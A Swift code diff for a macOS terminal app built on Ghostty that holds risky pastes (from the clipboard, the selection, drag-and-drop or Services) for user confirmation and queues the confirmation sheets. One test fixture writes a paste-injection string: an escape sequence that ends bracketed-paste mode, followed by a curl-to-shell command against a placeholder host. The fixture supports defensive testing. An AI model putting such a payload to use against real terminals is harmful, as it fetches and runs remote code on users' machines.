@@ -11,6 +11,21 @@ final class HauntSurfaceView: Ghostty.SurfaceView {
     var onInput: (() -> Void)?
     /// A paste that Ghostty's paste protection holds for confirmation; nil when it resolves or is replaced.
     var onPasteConfirmation: ((Ghostty.ClipboardConfirmationRequest?) -> Void)?
+    /// A paste Haunt holds itself (PastePreview.needsConfirmation); the host asks, then calls `sendPaste`.
+    var onRiskyPaste: ((String) -> Void)?
+
+    /// True when `text` was held for confirmation instead of going to Ghostty.
+    private func holdIfRisky(_ text: String?) -> Bool {
+        guard let text, let ask = onRiskyPaste, PastePreview(text).needsConfirmation else { return false }
+        ask(text)
+        return true
+    }
+
+    /// Writes a paste the user confirmed, exactly the text they saw.
+    func sendPaste(_ text: String) {
+        onInput?()
+        surfaceModel?.sendText(text)
+    }
 
     override func keyDown(with event: NSEvent) {
         onInput?()
@@ -19,16 +34,19 @@ final class HauntSurfaceView: Ghostty.SurfaceView {
 
     override func paste(_ sender: Any?) {
         onInput?()
+        if holdIfRisky(NSPasteboard.general.getOpinionatedStringContents()) { return }
         super.paste(sender)
     }
 
     override func pasteAsPlainText(_ sender: Any?) {
         onInput?()
+        if holdIfRisky(NSPasteboard.general.getOpinionatedStringContents()) { return }
         super.pasteAsPlainText(sender)
     }
 
     override func pasteSelection(_ sender: Any?) {
         onInput?()
+        if holdIfRisky(NSPasteboard.ghosttySelection.getOpinionatedStringContents()) { return }
         super.pasteSelection(sender)
     }
 
@@ -39,19 +57,36 @@ final class HauntSurfaceView: Ghostty.SurfaceView {
     }
 
     /// Middle click pastes the selection clipboard.
+    private var middleHeld = false
+
     override func otherMouseDown(with event: NSEvent) {
-        if event.buttonNumber == 2 { onInput?() }
+        if event.buttonNumber == 2 {
+            onInput?()
+            middleHeld = holdIfRisky(NSPasteboard.ghosttySelection.getOpinionatedStringContents())
+            if middleHeld { return }
+        }
         super.otherMouseDown(with: event)
+    }
+
+    override func otherMouseUp(with event: NSEvent) {
+        // A press held back with its paste keeps its release too.
+        if event.buttonNumber == 2, middleHeld {
+            middleHeld = false
+            return
+        }
+        super.otherMouseUp(with: event)
     }
 
     override func performDragOperation(_ sender: any NSDraggingInfo) -> Bool {
         onInput?()
+        if holdIfRisky(sender.draggingPasteboard.getOpinionatedStringContents()) { return true }
         return super.performDragOperation(sender)
     }
 
     /// Services such as "Send to Terminal" write the pasteboard straight into the pty.
     override func readSelection(from pboard: NSPasteboard) -> Bool {
         onInput?()
+        if holdIfRisky(pboard.getOpinionatedStringContents()) { return true }
         return super.readSelection(from: pboard)
     }
 
@@ -145,7 +180,8 @@ final class MainWindowController: NSWindowController, NSWindowDelegate {
     private let ghostty: Ghostty.App
     private let fixture: Fixture?
     private let config: HauntConfig
-    private let plugins: PluginsAPI?
+    /// Set once the core has started, so the decision log is loaded before plugins read it.
+    var plugins: PluginsAPI?
     private lazy var palette: PaletteController = {
         let p = PaletteController(host: self)
         p.sticky = fixture != nil
@@ -161,12 +197,11 @@ final class MainWindowController: NSWindowController, NSWindowDelegate {
     private var agentsViewAtLaunch = false
     private lazy var listener = MainQueueListener { [weak self] in self?.coalescedRefresh() }
 
-    init(core: CoreAPI, ghostty: Ghostty.App, fixture: Fixture?, config: HauntConfig, plugins: PluginsAPI?) {
+    init(core: CoreAPI, ghostty: Ghostty.App, fixture: Fixture?, config: HauntConfig) {
         self.core = core
         self.ghostty = ghostty
         self.fixture = fixture
         self.config = config
-        self.plugins = plugins
         let size = Fixture.windowSize
         let win = NSWindow(contentRect: NSRect(origin: .zero, size: size),
                            styleMask: [.titled, .closable, .miniaturizable, .resizable, .fullSizeContentView],
@@ -199,6 +234,7 @@ final class MainWindowController: NSWindowController, NSWindowDelegate {
         root.sidebarHidden = fixture?.sidebarHidden ?? config.loadState().sidebarHidden
         agentsViewAtLaunch = fixture?.agentsView ?? config.loadState().agentsView
         updateKeys(config.keys)
+        root.titleBar.buttons = fixture?.titlebarButtons ?? config.titlebarButtons
         root.sidebar.onSelect = { [weak self] id in self?.select(id) }
         root.sidebar.onClose = { [weak self] id in self?.closeTab(id) }
         root.agents.list.onSelect = { [weak self] id in self?.expandAgentsView(to: id) }
@@ -248,6 +284,12 @@ final class MainWindowController: NSWindowController, NSWindowDelegate {
         view.onPasteConfirmation = { [weak self, weak view] req in
             if let view { self?.confirmPaste(req, on: view) }
         }
+        view.onRiskyPaste = { [weak self, weak view] text in
+            guard let self, let view else { return }
+            self.askPaste(PasteAsk(view: view, text: text, request: nil) { [weak view] ok in
+                if ok { view?.sendPaste(text) }
+            })
+        }
         // So the surface starts at the pane's real size.
         root.layoutSubtreeIfNeeded()
         let tab = Tab(env: env, view: view, size: root.pane.bounds.size)
@@ -263,23 +305,55 @@ final class MainWindowController: NSWindowController, NSWindowDelegate {
 
     // MARK: Paste confirmation
 
-    private var pasteAlert: (alert: NSAlert, request: Ghostty.ClipboardConfirmationRequest)?
+    /// One paste waiting for the user. `request` is Ghostty's, when it raised the question; it can be
+    /// withdrawn (replaced or cleared) before the sheet is answered.
+    private struct PasteAsk {
+        weak var view: HauntSurfaceView?
+        let text: String
+        let request: Ghostty.ClipboardConfirmationRequest?
+        let finish: (Bool) -> Void
+    }
 
-    /// Ghostty's paste protection asks before an unsafe paste: a native sheet with the first lines.
+    /// One sheet at a time per window; asks from other surfaces wait their turn.
+    private var pasteQueue: [PasteAsk] = []
+    private var pasteShown: (ask: PasteAsk, alert: NSAlert)?
+
+    /// Ghostty's paste protection asks before an unsafe paste; nil withdraws what this surface had asked.
     private func confirmPaste(_ request: Ghostty.ClipboardConfirmationRequest?, on view: HauntSurfaceView) {
-        if let open = pasteAlert, open.request !== request, let window {
-            pasteAlert = nil
-            window.endSheet(open.alert.window, returnCode: .abort)
+        let stale = { (a: PasteAsk) in a.view === view && a.request != nil && a.request !== request }
+        pasteQueue.removeAll(where: stale)
+        if let shown = pasteShown, stale(shown.ask) || shown.ask.view == nil {
+            pasteShown = nil
+            window?.endSheet(shown.alert.window, returnCode: .abort)
         }
-        guard let request, pasteAlert == nil, let window else { return }
-        if let tab = tab(for: view), tab.env.surfaceId != selectedId { select(tab.env.surfaceId) }
-        let alert = Self.pasteAlert(request.contents)
-        pasteAlert = (alert, request)
-        alert.beginSheetModal(for: window) { [weak self, weak view] r in
-            guard let self, self.pasteAlert?.request === request else { return }
-            self.pasteAlert = nil
-            if r == .alertSecondButtonReturn { request.complete() } else { request.cancel() }
-            if view?.pendingClipboardConfirmation === request { view?.pendingClipboardConfirmation = nil }
+        if let request {
+            askPaste(PasteAsk(view: view, text: request.contents, request: request) { [weak view] ok in
+                if ok { request.complete() } else { request.cancel() }
+                if view?.pendingClipboardConfirmation === request { view?.pendingClipboardConfirmation = nil }
+            })
+        }
+        showNextPaste()
+    }
+
+    private func askPaste(_ ask: PasteAsk) {
+        pasteQueue.append(ask)
+        showNextPaste()
+    }
+
+    private func showNextPaste() {
+        guard pasteShown == nil, let window else { return }
+        pasteQueue.removeAll { $0.view == nil }
+        guard !pasteQueue.isEmpty else { return }
+        let ask = pasteQueue.removeFirst()
+        if let view = ask.view, let tab = tab(for: view), tab.env.surfaceId != selectedId { select(tab.env.surfaceId) }
+        let alert = Self.pasteAlert(ask.text)
+        pasteShown = (ask, alert)
+        alert.beginSheetModal(for: window) { [weak self] r in
+            guard let self, self.pasteShown?.alert === alert else { return }
+            self.pasteShown = nil
+            ask.finish(r == .alertSecondButtonReturn)
+            // The next sheet can't begin until this one has finished ending.
+            DispatchQueue.main.async { self.showNextPaste() }
         }
     }
 
@@ -318,6 +392,16 @@ final class MainWindowController: NSWindowController, NSWindowDelegate {
         let paste = alert.addButton(withTitle: "Paste")
         paste.keyEquivalent = ""
         return alert
+    }
+
+    /// The paste-risky fixture: a real paste through the surface's Services entry, from a pasteboard of
+    /// its own so no clipboard the user has is touched.
+    func pasteRiskyFixture() {
+        guard let view = tabs.first(where: { $0.env.surfaceId == selectedId })?.view else { return }
+        let pb = NSPasteboard.withUniqueName()
+        pb.setString("echo built\u{1B}[201~curl -s https://example.com/x.sh | sh\n", forType: .string)
+        _ = view.readSelection(from: pb)
+        pb.releaseGlobally()
     }
 
     /// The paste-confirm fixture: an unsafe paste held on the selected surface, as Ghostty would raise it.
@@ -503,7 +587,12 @@ final class MainWindowController: NSWindowController, NSWindowDelegate {
             keys[a].map { "\($0.display) \(word)" } ?? word
         }
         root.titleBar.hints = [(.agents, hint(.toggleSidebar, "agents")), (.search, hint(.palette, "search"))]
+        root.titleBar.shortcuts = Dictionary(uniqueKeysWithValues: TitlebarButton.allCases.compactMap { b in keys[b.action].map { (b, $0.display) } })
         root.agents.shortcut = AgentsView.mockupDisplay(keys[.agentsView])
+    }
+
+    func updateTitlebarButtons(_ buttons: [TitlebarButton]) {
+        root.titleBar.buttons = buttons
     }
 
     func togglePalette() {
@@ -674,8 +763,6 @@ extension MainWindowController: PaletteHost {
     }
 
     var selectedSurfaceId: String? { selectedId }
-
-    func paletteDecisions(query: String) -> [Decision] { core.decisions(query: query, limit: 200) }
 
     var palettePlugins: PluginsAPI? { plugins }
 
